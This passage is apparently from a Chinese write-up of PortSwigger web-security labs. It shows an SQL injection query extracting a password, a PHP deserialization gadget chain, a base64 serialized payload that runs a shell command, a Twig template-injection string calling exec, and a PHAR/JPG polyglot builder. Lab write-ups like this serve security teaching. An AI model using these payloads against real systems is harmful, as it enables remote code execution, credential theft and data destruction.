接着就是查密码。

```
' union select null,null,null,cast(password as numeric),null,null,null,null from users --
```

得到密码：`erq4k3ik3ps5ai56a6ki`

最后就是登陆进去，然后删除carlos账户。

#### 9. Developing a custom gadget chain for PHP deserialization

> By deploying a custom gadget chain, you can exploit its **insecure deserialization** to achieve **remote code execution**. To solve the lab, delete the **morale.txt** file from **Carlos's home directory**.

在网页注释里找到`/cgi-bin/libs/CustomTemplate.php`。

直接进去没有东西，应该是执行了，尝试访问备份文件:`/cgi-bin/libs/CustomTemplate.php~`

得到源代码：

```php
<?php

class CustomTemplate {
    private $default_desc_type;
    private $desc;
    public $product;

    public function __construct($desc_type='HTML_DESC') {
        $this->desc = new Description();
        $this->default_desc_type = $desc_type;
        // Carlos thought this is cool, having a function called in two places... What a genius
        $this->build_product();
    }

    public function __sleep() {
        return ["default_desc_type", "desc"];
    }

    public function __wakeup() {
        $this->build_product();
    }

    private function build_product() {
        $this->product = new Product($this->default_desc_type, $this->desc);
    }
}

class Product {
    public $desc;

    public function __construct($default_desc_type, $desc) {
        $this->desc = $desc->$default_desc_type;
    }
}

class Description {
    public $HTML_DESC;
    public $TEXT_DESC;

    public function __construct() {
        // @Carlos, what were you thinking with these descriptions? Please refactor!
        $this->HTML_DESC = '<p>This product is <blink>SUPER</blink> cool in html</p>';
        $this->TEXT_DESC = 'This product is cool in text';
    }
}

class DefaultMap {
    private $callback;

    public function __construct($callback) {
        $this->callback = $callback;
    }

    public function __get($name) {
        return call_user_func($this->callback, $name);
    }
}

?>
```

如果要反序列化，只有`CustomTemplate`里有一个`__wakeup()`函数，那就从那里开始。

反序列化之后调用了`build_product()`函数，在这个函数里面将`$this->default_desc_type, $this->desc`两个参数放入了`Product`的构造函数，而在构造函数里面直接用了`$desc->$default_desc_type`。

倒回去看这里的`$desc`是什么：`$this->desc = new Description();`

看到这段代码才发现`desc`是实例化了一个类，而上面的`$desc->$default_desc_type`相当于是`Description`的`$HTML_DESC`。

到这里前三个类都用了，第四个类看看有什么：

```php
public function __get($name) {
	return call_user_func($this->callback, $name);
}
```

一个`__get()`的魔术方法：`__get() `用于从不可访问的属性读取数据。

看到这里，想到上面的`$desc->$default_desc_type`，如果要是`$desc`是`DefaultMap`类应该就可以出发这个了。

我一开始是这样的：

```php
<?php

class CustomTemplate {
// 省略
    public function __construct() {
        $this->desc = new DefaultMap(function(){system('rm /home/carlos/morale.txt')});
        $this->default_desc_type = "callback";
        $this->build_product();
    }
// 省略
}

// 省略

$a = new CustomTemplate();
echo base64_encode(serialize($a));
?>
```

然后有闭包函数，不给序列化。

然后我将`function(){system('rm /home/carlos/morale.txt')}`改成了`"function(){system('rm /home/carlos/morale.txt')}"`，序列化成功，让burp发出去，饭后网页返回报错。

```
PHP Warning:  call_user_func() expects parameter 1 to be a valid callback, function &apos;function(){system(&apos;rm /home/carlos/morale.txt&apos;)}&apos; not found or invalid function name in /home/carlos/cgi-bin/libs/CustomTemplate.php on line 55
```

就是说它把我这一个字符串当成了一个函数名字，它执行的时候找不到。

那我直接传`system`字符串，然后将`'rm /home/carlos/morale.txt'`作为参数传进去就好了。

payload：

```php
<?php

class CustomTemplate {
    private $default_desc_type;
    private $desc;
    public $product;

    public function __construct() {
        $this->desc = new DefaultMap("system");
        $this->default_desc_type = "rm /home/carlos/morale.txt";
        $this->build_product();
    }

    public function __sleep() {
        return ["default_desc_type", "desc"];
    }

    public function __wakeup() {
        $this->build_product();
    }

    private function build_product() {
        $this->product = new Product($this->default_desc_type, $this->desc);
    }
}

class Product {
    public $desc;

    public function __construct($default_desc_type, $desc) {
        $this->desc = $desc->$default_desc_type;
    }
}

class DefaultMap {
    private $callback;

    public function __construct($callback) {
        $this->callback = $callback;
    }

    public function __get($name) {
        return call_user_func($this->callback, $name);
    }
}

$a = new CustomTemplate();
echo base64_encode(serialize($a));
?>
```

他在这里`$desc->$default_desc_type`其实是找不到`DefaultMap`里面的`rm ...`参数的，所以会认为其实是不可访问，然后将`rm ...`作为`$name`参数传递进`__get()`函数，而此时这里的`$callback = 'system'`，也就是说`__get()`函数里面其实是：
`call_user_func('system', "rm /home/carlos/morale.txt");`，也就相当于执行的`system("rm /home/carlos/morale.txt")`命令。

结果：

```
TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjI6e3M6MzM6IgBDdXN0b21UZW1wbGF0ZQBkZWZhdWx0X2Rlc2NfdHlwZSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO3M6MjA6IgBDdXN0b21UZW1wbGF0ZQBkZXNjIjtPOjEwOiJEZWZhdWx0TWFwIjoxOntzOjIwOiIARGVmYXVsdE1hcABjYWxsYmFjayI7czo2OiJzeXN0ZW0iO319
```

官方这里没有用`system`，用的是`exec`

#### 10. Using PHAR deserialization to deploy a custom gadget chain

> To solve the lab, delete the `morale.txt` file from Carlos's home directory.

先去`/cgi-bin`。

**blog.php:**

```php
<?php

require_once('/usr/local/envs/php-twig-1.19/vendor/autoload.php');

class Blog {
    public $user;
    public $desc;
    private $twig;

    public function __construct($user, $desc) {
        $this->user = $user;
        $this->desc = $desc;
    }

    public function __toString() {
        return $this->twig->render('index', ['user' => $this->user]);
    }

    public function __wakeup() {
        $loader = new Twig_Loader_Array([
            'index' => $this->desc,
        ]);
        $this->twig = new Twig_Environment($loader);
    }

    public function __sleep() {
        return ["user", "desc"];
    }
}

?>
```

**CustomTemplate.php:**

```php
<?php

class CustomTemplate {
    private $template_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
    }

    private function isTemplateLocked() {
        return file_exists($this->lockFilePath());
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lockFilePath(), "") === false) {
                throw new Exception("Could not write to " . $this->lockFilePath());
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        @unlink($this->lockFilePath());
    }

    private function lockFilePath()
    {
        return 'templates/' . $this->template_file_path . '.lock';
    }
}

?>
```

这里按照材料里说的，应该是用图片+phar协议。

**过程：**

* Twig有模板注入漏洞（**SSTI**），并且可以看到使用了render函数。

    ```
    $this->twig->render('index', ['user' => $this->user]);
    ```

    找到注入用的模板:

    ```
    {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}
    ```

* 编写php注入代码：

    ```php
    class CustomTemplate {}
    class Blog {}
    $object = new CustomTemplate;
    $blog = new Blog;
    $blog->desc = '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}';
    $blog->user = 'user';
    $object->template_file_path = $blog;
    ```

* 使用[phar jpg polyglot](https://github.com/kunte0/phar-jpg-polyglot)工具:

    **1.php:**

    ```php
    <?php
    
    
    function generate_base_phar($o, $prefix){
        global $tempname;
        @unlink($tempname);
        $phar = new Phar($tempname);
        $phar->startBuffering();
        $phar->addFromString("test.txt", "test");
        $phar->setStub("$prefix<?php __HALT_COMPILER(); ?>");
        $phar->setMetadata($o);
        $phar->stopBuffering();
        
        $basecontent = file_get_contents($tempname);
        @unlink($tempname);
        return $basecontent;
    }
    
    function generate_polyglot($phar, $jpeg){
        $phar = substr($phar, 6); // remove <?php dosent work with prefix
        $len = strlen($phar) + 2; // fixed 
        $new = substr($jpeg, 0, 2) . "\xff\xfe" . chr(($len >> 8) & 0xff) . chr($len & 0xff) . $phar . substr($jpeg, 2);
        $contents = substr($new, 0, 148) . "        " . substr($new, 156);
    
        // calc tar checksum
        $chksum = 0;
        for ($i=0; $i<512; $i++){
            $chksum += ord(substr($contents, $i, 1));
        }
        // embed checksum
        $oct = sprintf("%07o", $chksum);
        $contents = substr($contents, 0, 148) . $oct . substr($contents, 155);
        return $contents;
    }
    
    
    // 这里是上面编写的php代码
    class CustomTemplate {}
    class Blog {}
    $object = new CustomTemplate;
    $blog = new Blog;
    $blog->desc = '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}';
    $blog->user = 'user';
    $object->template_file_path = $blog;
    
    
    
    // config for jpg
    $tempname = 'temp.tar.phar'; // make it tar
    $jpeg = file_get_contents('in.jpg');
    $outfile = 'out.jpg';
    $payload = $object;
    $prefix = '';
    
    var_dump(serialize($object));
    
    
    // make jpg
    file_put_contents($outfile, generate_polyglot(generate_base_phar($payload, $prefix), $jpeg));
    
    ?>
    ```

    **php.ini:**

    ```
    [phar]
    phar.readonly = 0
    ```

    然后再自己找一个图片，命名为：`in.jpg`，并和前面两个文件放到同一个目录。

    运行：`php -c php.ini 1.php`。会得到一个`out.jpg`。或者用 [burp现成的图片](https://github.com/PortSwigger/serialization-examples/blob/master/php/phar-jpg-polyglot.jpg)。

* 把图片传上去。

* 然后访问：

    ```
    /cgi-bin/avatar.php?avatar=phar://wiener
    ```

